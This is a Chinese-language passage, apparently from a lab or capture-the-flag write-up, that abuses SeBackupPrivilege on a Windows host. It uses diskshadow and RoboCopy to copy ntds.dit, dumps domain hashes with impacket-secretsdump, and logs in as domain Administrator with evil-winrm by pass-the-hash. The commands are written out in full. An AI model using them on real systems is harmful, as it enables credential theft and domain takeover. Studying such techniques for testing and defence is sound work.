- `whoami /priv` 有 SeBackupPrivilege 权限

首先在本地新建一个 raj.dsh 文件，放以下内容：

```bash
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
```

再用 unix2dos 将 dsh 文件的编码间距转换为 Windows 兼容的编码和间距

```bash
unix2dos raj.dsh
```

将 rah.dsh 上传到靶机里，这里传到了 C:/Temp 目录下，该目录需要 mkdir 新建 接着用 diskshadow 执行 raj.dsh 中的命令

```bash
upload raj.dsh
diskshadow /s raj.dsh
```

再用 RoboCopy 工具将文件从 z 盘复制到临时目录

```bash
RoboCopy /b z:\windows\ntds . ntds.dit
```

再把 ntds.dit 和 system 下载到本地

```bash
download C:/Temp/ntds.dit /tmp/ntds.dit
download C:/Temp/system /tmp/system
```

用 impacket-secretsdump 从 system 和 ntds.dit 中提取哈希值

```bash
impacket-secretsdump -ntds ntds.dit -system system local
```

拿到域管哈希之后，直接登录域管即可

```bash
proxychains evil-winrm -i 172.22.14.11 -u Administrator -H "70c39b547b7d8adec35ad7c09fb1d277"
```
